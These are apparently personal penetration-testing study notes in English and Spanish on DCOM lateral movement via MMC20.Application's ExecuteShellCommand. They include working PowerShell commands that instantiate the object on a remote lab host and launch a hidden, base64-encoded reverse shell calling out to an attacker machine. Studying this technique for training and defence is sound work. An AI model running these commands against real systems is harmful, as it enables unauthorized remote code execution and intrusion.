## DESCRIPTION

In this section, we will inspect a fairly recent lateral movement technique that exploits the Distributed Component Object Model (DCOM)1 and learn how it can be abused for lateral movement.2

The Microsoft Component Object Model (COM)3 is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.

Both COM and DCOM are very old technologies dating back to the very first editions of Windows.4 Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.

Cyberason documented5 a collection of various DCOM lateral movement techniques, including one discovered by Matt Nelson,6 which we are covering in this section.

The discovered DCOM lateral movement technique is based on the Microsoft Management Console (MMC)7 COM application that is employed for scripted automation of Windows systems.

The MMC Application Class allows the creation of Application Objects,8 which expose the ExecuteShellCommand method under the Document.ActiveView property. As its name suggests, this method allows execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.

#### Mas información
* 


## EXPLOITATION

1. From an elevated PowerShell prompt, we can instantiate a remote MMC 2.0 application by specifying the target IP of FILES04 as the second argument of the GetTypeFromProgID method.

```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```


2. Ejecutamos un comando en este caso una powersehll [[POWERSHELL REVERSESHELL]]

```
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```


## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 